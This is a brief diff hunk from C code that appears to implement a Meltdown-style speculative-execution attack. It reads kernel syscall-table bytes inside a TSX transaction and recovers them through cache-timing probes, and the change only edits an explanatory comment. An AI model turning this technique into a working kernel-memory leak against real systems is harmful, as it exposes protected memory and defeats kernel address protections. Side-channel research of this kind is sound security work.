@@ -85,7 +85,7 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         // Speculatively read byte from kernel address and execute a dependent instruction on
         // buf[read byte * 4096] which makes L1 cache it.
         // Subsequently, we measure access time for i={0..255} buf[i * 4096], and we assume
-        // the one with fastest access is the byte read from the address in the kernel.
+        // the i of the one with fastest access is the actual byte read from the kernel address.
         if (_xbegin() == _XBEGIN_STARTED) {
             __speculative_byte_load(target_address, pages);
             _xend();
